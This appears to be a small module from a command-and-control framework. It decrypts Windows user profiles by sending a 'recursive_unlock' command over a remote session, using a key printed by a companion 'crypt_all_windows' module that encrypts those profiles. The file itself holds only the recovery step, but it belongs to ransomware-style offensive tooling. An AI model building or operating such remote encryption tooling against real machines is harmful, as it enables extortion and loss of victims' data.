// Recovery for crypt_all_windows: recursively decrypt user profiles.
// Pass the key printed by the crypt module run as the first argument.
// An optional second argument overrides the target path (default C:\Users).
fn run(session_id, args) {
    if args.len < 1 {
        return "Usage: decrypt_all_windows <hex_key> [path] - the key is printed by the crypt module run";
    }
    let key = args[0];
    let path = if args.len > 1 { args[1] } else { "C:\\Users" };
    print("Decrypting " + path + " for session " + session_id);
    let res = send_c2_extension(session_id, "recursive_unlock", [path, key]);
    return "Deployed: " + res;
}
